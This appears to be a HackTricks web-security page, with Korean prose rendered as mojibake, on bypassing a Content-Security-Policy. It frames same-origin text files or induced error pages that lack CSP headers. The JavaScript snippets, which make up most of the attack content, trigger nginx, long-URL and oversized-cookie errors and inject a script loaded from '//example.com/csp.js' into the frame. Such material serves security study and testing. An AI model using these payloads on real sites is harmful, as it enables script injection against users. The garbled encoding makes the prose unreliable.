<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ì„ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°êµë¥¼ ê³µìœ í•˜ì„¸ìš”.

</details>


ë‹¤ìŒê³¼ ê°™ì€ êµ¬ì„±:
```
Content-Security-Policy: default-src 'self' 'unsafe-inline';
```
ì–´ë–¤ í•¨ìˆ˜ë“¤ì´ ë¬¸ìì—´ë¡œ ì „ë‹¬ëœ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ëŠ” ê²ƒì„ ê¸ˆì§€í•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, `eval, setTimeout, setInterval`ì€ ëª¨ë‘ `unsafe-eval` ì„¤ì • ë•Œë¬¸ì— ì°¨ë‹¨ë©ë‹ˆë‹¤.

ì™¸ë¶€ ì†ŒìŠ¤ë¡œë¶€í„°ì˜ ëª¨ë“  ì½˜í…ì¸ ë„ ì°¨ë‹¨ë©ë‹ˆë‹¤. ì´ë¯¸ì§€, CSS, ì›¹ì†Œì¼“, íŠ¹íˆ JSê¹Œì§€ ëª¨ë‘ í¬í•¨ë©ë‹ˆë‹¤.

### í…ìŠ¤íŠ¸ ë° ì´ë¯¸ì§€ë¥¼ í†µí•œ ìš°íšŒ

í˜„ëŒ€ì ì¸ ë¸Œë¼ìš°ì €ë“¤ì€ ì´ë¯¸ì§€ì™€ í…ìŠ¤íŠ¸ë¥¼ HTMLë¡œ ë³€í™˜í•˜ì—¬ í‘œì‹œë¥¼ ê°œì„ í•©ë‹ˆë‹¤ (ì˜ˆ: ë°°ê²½ ì„¤ì •, ê°€ìš´ë° ì •ë ¬ ë“±). ë”°ë¼ì„œ `favicon.ico`ë‚˜ `robots.txt`ì™€ ê°™ì€ ì´ë¯¸ì§€ë‚˜ í…ìŠ¤íŠ¸ íŒŒì¼ì´ `iframe`ì„ í†µí•´ ì—´ë¦¬ë©´ HTMLë¡œ ë Œë”ë§ë©ë‹ˆë‹¤. íŠ¹íˆ, ì´ëŸ¬í•œ í˜ì´ì§€ë“¤ì€ ì¢…ì¢… CSP í—¤ë”ê°€ ì—†ê±°ë‚˜ X-Frame-Optionsë¥¼ í¬í•¨í•˜ì§€ ì•Šì„ ìˆ˜ ìˆìœ¼ë¯€ë¡œ ì„ì˜ì˜ JavaScriptë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆê²Œ ë©ë‹ˆë‹¤:
```javascript
frame=document.createElement("iframe");
frame.src="/css/bootstrap.min.css";
document.body.appendChild(frame);
script=document.createElement('script');
script.src='//example.com/csp.js';
window.frames[0].document.head.appendChild(script);
```
### ì˜¤ë¥˜ë¥¼ í†µí•œ ìš°íšŒ

ë§ˆì°¬ê°€ì§€ë¡œ, í…ìŠ¤íŠ¸ íŒŒì¼ì´ë‚˜ ì´ë¯¸ì§€ì™€ ê°™ì€ ì˜¤ë¥˜ ì‘ë‹µì€ ì¼ë°˜ì ìœ¼ë¡œ CSP í—¤ë”ê°€ ì—†ì„ ìˆ˜ ìˆìœ¼ë©° X-Frame-Optionsë¥¼ ìƒëµí•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤. ì˜¤ë¥˜ë¥¼ iframe ë‚´ì—ì„œ ë¡œë“œí•˜ë„ë¡ ìœ ë„í•¨ìœ¼ë¡œì¨ ë‹¤ìŒê³¼ ê°™ì€ ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```javascript
// Inducing an nginx error
frame=document.createElement("iframe");
frame.src="/%2e%2e%2f";
document.body.appendChild(frame);

// Triggering an error with a long URL
frame=document.createElement("iframe");
frame.src="/"+"A".repeat(20000);
document.body.appendChild(frame);

// Generating an error via extensive cookies
for(var i=0;i<5;i++){document.cookie=i+"="+"a".repeat(4000)};
frame=document.createElement("iframe");
frame.src="/";
document.body.appendChild(frame);
// Removal of cookies is crucial post-execution
for(var i=0;i<5;i++){document.cookie=i+"="}
```
ì–¸ê¸‰ëœ ì‹œë‚˜ë¦¬ì˜¤ ì¤‘ í•˜ë‚˜ë¥¼ íŠ¸ë¦¬ê±°í•œ í›„ì—ëŠ” ë‹¤ìŒê³¼ ê°™ì´ iframe ë‚´ì—ì„œ JavaScript ì‹¤í–‰ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤:
```javascript
script=document.createElement('script');
script.src='//example.com/csp.js';
window.frames[0].document.head.appendChild(script);
```
## ì°¸ê³  ìë£Œ

* [https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)


<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ì„ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>
